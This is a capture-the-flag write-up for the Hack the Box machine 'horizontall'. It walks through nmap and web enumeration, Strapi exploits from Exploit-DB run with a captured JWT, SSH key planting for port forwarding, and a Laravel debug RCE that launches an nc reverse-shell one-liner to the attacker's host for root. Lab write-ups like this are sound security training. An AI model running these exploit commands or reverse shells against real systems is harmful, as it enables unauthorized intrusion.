# Hack the Box - horizontall - 10.10.11.105

# Enumeration
## Nmap
### Inital Scan
Command
```
nmap -A -vv -oA enum/nmap-initial 10.10.11.105
```

Output
```
PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 ee:77:41:43:d4:82:bd:3e:6e:6e:50:cd:ff:6b:0d:d5 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDL2qJTqj1aoxBGb8yWIN4UJwFs4/UgDEutp3aiL2/6yV2iE78YjGzfU74VKlTRvJZWBwDmIOosOBNl9nfmEzXerD0g5lD5SporBx06eWX/XP2sQSEKbsqkr7Qb4ncvU8CvDR6yGHxmBT8WGgaQsA2ViVjiqAdlUDmLoT2qA3GeLBQgS41e+TysTpzWlY7z/rf/u0uj/C3kbixSB/upkWoqGyorDtFoaGGvWet/q7j5Tq061MaR6cM2CrYcQxxnPy4LqFE3MouLklBXfmNovryI0qVFMki7Cc3hfXz6BmKppCzMUPs8VgtNgdcGywIU/Nq1aiGQfATneqDD2GBXLjzV
|   256 3a:d5:89:d5:da:95:59:d9:df:01:68:37:ca:d5:10:b0 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBIyw6WbPVzY28EbBOZ4zWcikpu/CPcklbTUwvrPou4dCG4koataOo/RDg4MJuQP+sR937/ugmINBJNsYC8F7jN0=
|   256 4a:00:04:b4:9d:29:e7:af:37:16:1b:4f:80:2d:98:94 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJqmDVbv9RjhlUzOMmw3SrGPaiDBgdZ9QZ2cKM49jzYB
80/tcp open  http    syn-ack nginx 1.14.0 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: nginx/1.14.0 (Ubuntu)
|_http-title: Did not follow redirect to http://horizontall.htb
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

### Full Scan
Command
```
nmap -A -vv -p- -oA enum/nmap-full 10.10.11.105
```

Output
```
PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 ee:77:41:43:d4:82:bd:3e:6e:6e:50:cd:ff:6b:0d:d5 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDL2qJTqj1aoxBGb8yWIN4UJwFs4/UgDEutp3aiL2/6yV2iE78YjGzfU74VKlTRvJZWBwDmIOosOBNl9nfmEzXerD0g5lD5SporBx06eWX/XP2sQSEKbsqkr7Qb4ncvU8CvDR6yGHxmBT8WGgaQsA2ViVjiqAdlUDmLoT2qA3GeLBQgS41e+TysTpzWlY7z/rf/u0uj/C3kbixSB/upkWoqGyorDtFoaGGvWet/q7j5Tq061MaR6cM2CrYcQxxnPy4LqFE3MouLklBXfmNovryI0qVFMki7Cc3hfXz6BmKppCzMUPs8VgtNgdcGywIU/Nq1aiGQfATneqDD2GBXLjzV
|   256 3a:d5:89:d5:da:95:59:d9:df:01:68:37:ca:d5:10:b0 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBIyw6WbPVzY28EbBOZ4zWcikpu/CPcklbTUwvrPou4dCG4koataOo/RDg4MJuQP+sR937/ugmINBJNsYC8F7jN0=
|   256 4a:00:04:b4:9d:29:e7:af:37:16:1b:4f:80:2d:98:94 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJqmDVbv9RjhlUzOMmw3SrGPaiDBgdZ9QZ2cKM49jzYB
80/tcp open  http    syn-ack nginx 1.14.0 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: nginx/1.14.0 (Ubuntu)
|_http-title: Did not follow redirect to http://horizontall.htb
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```

## Port 80

IP Address redirects us to "horizontall.htb".

![](../Attachments/Pasted%20image%2020210925224024.png)

Put "horizontall.htb" in /etc/hosts file.
```
sudo vim /etc/hosts
```

![](../Attachments/Pasted%20image%2020210925224140.png)

Going to http://horiziontall.htb.

![](../Attachments/Pasted%20image%2020210925224306.png)

### Nikto
Command
```
nikto -h http://horizontall.htb -o enum/nikto.txt
```

Output
```
---------------------------------------------------------------------------
+ Server: nginx/1.14.0 (Ubuntu)
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ 7786 requests: 0 error(s) and 3 item(s) reported on remote host
+ End Time:           2021-09-25 22:50:50 (GMT-5) (280 seconds)
---------------------------------------------------------------------------
```

### GoBuster
Command
```
gobuster dir -u http://horizontall.htb -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -o enum/gobuster.txt
```

Output
```
===============================================================
/img                  (Status: 301) [Size: 194] [--> http://horizontall.htb/img/]
/css                  (Status: 301) [Size: 194] [--> http://horizontall.htb/css/]
/js                   (Status: 301) [Size: 194] [--> http://horizontall.htb/js/] 
                                                                                 
===============================================================
```

### API sub page located

```
http://api-prod.horizontall.htb
```

![](../Attachments/Pasted%20image%2020210926151808.png)

Added subpage to /etc/hosts

![](../Attachments/Pasted%20image%2020210926151924.png)

## API-PROD page

![](../Attachments/Pasted%20image%2020210926152002.png)

### Gobuster
```
gobuster dir -u http://api-prod.horizontall.htb -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -o enum/gobuster-apiprod.txt
```

Results
```
===============================================================
/reviews              (Status: 200) [Size: 507]
/users                (Status: 403) [Size: 60] 
/admin                (Status: 200) [Size: 854]
/Reviews              (Status: 200) [Size: 507]
/Users                (Status: 403) [Size: 60] 
/Admin                (Status: 200) [Size: 854]
/REVIEWS              (Status: 200) [Size: 507]
/%C0                  (Status: 400) [Size: 69] 
/%D8                  (Status: 400) [Size: 69] 
/%CF                  (Status: 400) [Size: 69] 
/%CE                  (Status: 400) [Size: 69] 
/%CD                  (Status: 400) [Size: 69] 
/%CC                  (Status: 400) [Size: 69] 
/%CB                  (Status: 400) [Size: 69] 
/%CA                  (Status: 400) [Size: 69] 
/%D0                  (Status: 400) [Size: 69] 
/%D1                  (Status: 400) [Size: 69] 
/%D7                  (Status: 400) [Size: 69] 
/%D6                  (Status: 400) [Size: 69] 
/%D5                  (Status: 400) [Size: 69] 
/%D4                  (Status: 400) [Size: 69] 
/%D3                  (Status: 400) [Size: 69] 
/%D2                  (Status: 400) [Size: 69] 
/%C9                  (Status: 400) [Size: 69] 
/%C8                  (Status: 400) [Size: 69] 
/%C1                  (Status: 400) [Size: 69] 
/%C7                  (Status: 400) [Size: 69] 
/%C2                  (Status: 400) [Size: 69] 
/%C6                  (Status: 400) [Size: 69] 
/%C5                  (Status: 400) [Size: 69] 
/%C4                  (Status: 400) [Size: 69] 
/%C3                  (Status: 400) [Size: 69] 
/%D9                  (Status: 400) [Size: 69] 
/%DF                  (Status: 400) [Size: 69] 
/%DE                  (Status: 400) [Size: 69] 
/%DD                  (Status: 400) [Size: 69] 
/%DB                  (Status: 400) [Size: 69] 
                                               
===============================================================
```

---

# Vulnerabilities

## Admin page

![](../Attachments/Pasted%20image%2020210926152234.png)

Using the exploit below we can create a user on the Strapi application.
https://www.exploit-db.com/exploits/50239

User Created
```
admin@horizontall.htb:SuperStrongPassword1
```

![](../Attachments/Pasted%20image%2020210926153719.png)

Access to the admin portal.

![](../Attachments/Pasted%20image%2020210926153838.png)

Plugin to create, read, and update different languages found in the marketplace.

![](../Attachments/Pasted%20image%2020210926161611.png)

Attempting to downloaded plugin.

App needs to be started with "yarn develop".

![](../Attachments/Pasted%20image%2020210926170441.png)

Reviewing exploits again and finding a authenticated RCE.
https://www.exploit-db.com/exploits/50238

Gathered jwt token required for exploit from "Inspect element" on the webpage.

Executed script
```
python3 50238.py http://api-prod.horizontall.htb eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MywiaXNBZG1pbiI6dHJ1ZSwiaWF0IjoxNjMyNjkxNzc0LCJleHAiOjE2MzUyODM3NzR9.7X8UTJqsO3OeWXdIl1MsguBRKFZODY-0vrADk8N24lc "id" 10.10.14.11
```

Shows response for id command

![](../Attachments/Pasted%20image%2020210926171058.png)

Edited the code to perform a reverse shell(removed LPORT and adjusted the postData)

![](../Attachments/Pasted%20image%2020210926174041.png)

Reverse shell gained on target as strapi user.

![](../Attachments/Pasted%20image%2020210926174149.png)

---

# Privilege Escalation
## Running Processes

Port 8000 and 1337 are running on the target on the local network.

![](../Attachments/Pasted%20image%2020210926205210.png)

### Need to do a port forward to view the page.

Creating a ".ssh" folder and "authorized_key" file for strapi user on target.

Added in my public key to "authorized_keys" using echo to access machine via ssh.

![](../Attachments/Pasted%20image%2020210926210544.png)

Run port forwarding command
```
ssh -L 8000:127.0.0.1:8000 strapi@horizontall.htb
```

Laravel page exposed on port 8000

![](../Attachments/Pasted%20image%2020210926212418.png)

There is a Laravel v8 debug exploit on exploit db
https://www.exploit-db.com/exploits/49424

Needed to find the log location for Laravel. Assuming it is in ""/home/developer/myproject" as it is not in "/var/www/html"

After some trial and error for locating the log found logs are "/home/developer/myproject/storage/logs/laravel.log" and RCE.

```
python3 49424.py http://127.0.0.1:8000 /home/developer/myproject/storage/logs/laravel.log 'id' 
```

![](../Attachments/Pasted%20image%2020210926212908.png)

### Root Shell

```
python3 49424.py http://127.0.0.1:8000 /home/developer/myproject/storage/logs/laravel.log 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.10.14.11 31337 >/tmp/f'
```

![](../Attachments/Pasted%20image%2020210926213603.png)

---

# Loot
## User
>193c0ffabb2e8bc3e879368bbaee5db6

Command
```
ifconfig;id;hostname;cat user.txt
```

![](../Attachments/Pasted%20image%2020210926180235.png)

## Root/Admin
>ecdd41fddf5f87ae5483252633c7b0e9

Command
```
ifconfig;id;hostname;cat root.txt
```

![](../Attachments/Pasted%20image%2020210926213650.png)